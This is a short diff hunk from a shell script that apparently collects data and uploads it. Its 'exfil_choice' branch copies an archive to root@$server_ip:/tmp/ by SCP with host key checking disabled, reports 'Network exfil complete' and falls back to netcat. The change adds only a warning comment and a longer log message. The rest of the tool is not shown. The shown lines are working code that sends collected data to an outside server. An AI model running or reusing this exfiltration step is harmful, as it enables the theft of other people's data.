@@ -150,9 +150,10 @@ case $exfil_choice in
                 spinner_id=$(START_SPINNER "Uploading...")
                 
                 # Try SCP first
+                # WARNING: StrictHostKeyChecking=no disables host verification - use only in controlled environments
                 scp -o StrictHostKeyChecking=no "$ARCHIVE_FILE" "root@$server_ip:/tmp/" 2>/dev/null
                 if [ $? -eq 0 ]; then
-                    LOG "Uploaded via SCP"
+                    LOG "Uploaded via SCP (WARNING: Host key verification disabled)"
                     ALERT "Network exfil complete"
                 else
                     # Try netcat
